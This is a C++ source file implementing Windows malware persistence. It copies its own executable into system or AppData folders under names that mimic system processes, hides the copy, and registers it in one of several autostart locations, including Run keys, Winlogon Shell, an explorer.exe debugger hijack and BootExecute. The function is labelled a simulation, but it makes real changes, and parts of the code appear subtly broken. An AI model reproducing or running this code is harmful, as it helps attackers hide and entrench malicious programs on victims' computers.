#include <windows.h>
#include <winreg.h>
#include <shellapi.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <ctime>
#include <cstdlib>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

const std::vector<std::wstring> systemProcessNames = {
    L"winlog.exe",
    L"svchost.exe",
    L"issas.exe",
    L"csrss.exe",
    L"services.exe",
    L"smss.exe",
    L"spoolsv.exe",
    L"taskhost.exe",
    L"dwm.exe",
    L"explorer.exe",
    L"conhost.exe",
    L"ctfmon.exe"
};

struct PersistenceEntry {
    HKEY root;
    std::wstring subkey;
    std::wstring valueName;
    bool requireAdmin;
    bool isHiddenName;
};

std::vector<PersistenceEntry> persistenceEntries = {
    { HKEY_CURRENT_USER, L"Environment", L"UserInitMprLogonScript", false, false },
    { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"Run", false, false },
    { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"", false, true },
    { HKEY_CURRENT_USER, L"Software\\Microsoft\\Office\\16.0\\Word\\Options", L"STARTUP-PATH", false, false },
    { HKEY_CURRENT_USER, L"Environment", L"JAVA_TOOL_OPTIONS", false, false },
    { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", L"Payload", false, false },
    { HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services", L"", true, false },
    { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", true, false },
    { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe", L"Debugger", true, false },
    { HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager", L"BootExecute", true, false }
};

void PersistenceSimulation() {
    srand(static_cast<unsigned>(time(nullptr)));
    bool isAdmin = IsElevated();

    std::wstring chosenName = systemProcessNames[rand() % systemProcessNames.size()];

    wchar_t destDir[MAX_PATH];
    if (isAdmin) {
        GetSystemDirectoryW(destDir, MAX_PATH);
    } else {
        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, destDir) != S_OK) {
            GetCurrentDirectoryW(MAX_PATH, destDir);
        }
    }
    std::wstring destPath = std::wstring(destDir) + L"\\" + chosenName;

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (CopyFileW(exePath, destPath.c_str(), FALSE)) {
        SetFileAttributesW(destPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    std::vector<PersistenceEntry> available;
    for (const auto& entry : persistenceEntries) {
        if (!entry.requireAdmin || isAdmin) {
            available.push_back(entry);
        }
    }
    if (available.empty()) {
        return;
    }

    auto& chosenEntry = available[rand() % available.size()];

    HKEY hKey;
    DWORD dwDisposition;
    LONG result = RegCreateKeyExW(chosenEntry.root,
                                   chosenEntry.subkey.c_str(),
                                   0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
    if (result == ERROR_SUCCESS) {
        std::wstring valueName = chosenEntry.valueName;
        if (chosenEntry.isHiddenName) {
            valueName = L"\0" + valueName;
        }
        RegSetValueExW(hKey,
                       valueName.empty() ? NULL : valueName.c_str(),
                       0, REG_SZ,
                       (BYTE*)destPath.c_str(),
                       (DWORD)((destPath.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}